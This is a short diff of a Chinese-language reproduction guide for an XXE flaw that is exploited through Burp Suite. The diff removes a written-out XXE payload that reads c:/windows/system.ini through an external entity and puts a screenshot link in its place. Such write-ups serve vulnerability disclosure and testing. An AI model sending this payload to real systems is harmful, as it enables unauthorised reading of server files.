@@ -10,7 +10,6 @@
 2. 開啟burp suite攔截資料
 3. 將下面payload放置攔截資料底下
 
-   <!DOCTYPE a[<!ENTITY xxe SYSTEM "file:///c:/windows/system.ini">]>
-   <creds> &xxe; </creds>
-   
+   ![image](https://user-images.githubusercontent.com/110897397/183616476-575f5843-839d-4f56-a958-f2f9af7c9884.png)
+
 4.送出
